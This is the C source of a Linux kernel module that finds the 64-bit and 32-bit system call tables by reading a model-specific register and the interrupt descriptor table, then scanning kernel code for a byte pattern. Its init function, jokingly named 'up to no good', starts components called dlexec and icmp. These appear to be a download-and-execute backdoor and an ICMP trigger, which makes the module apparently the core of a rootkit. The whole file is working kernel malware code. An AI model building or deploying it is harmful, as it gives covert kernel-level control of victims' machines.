#include "common.h"

#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

unsigned long *sys_call_table;
unsigned long *ia32_sys_call_table;

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;


// http://bbs.chinaunix.net/thread-2143235-1-1.html
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Obtain sys_call_table on amd64; pouik
unsigned long *find_ia32_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}


static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{
    ia32_sys_call_table = find_ia32_sys_call_table();
    DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);

    sys_call_table = find_sys_call_table();

    DEBUG("sys_call_table obtained at %p\n", sys_call_table);

	dlexec_init();
    icmp_init();

    return 0;
}

static void __exit mischief_managed ( void )
{
   icmp_exit();
   dlexec_exit();
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
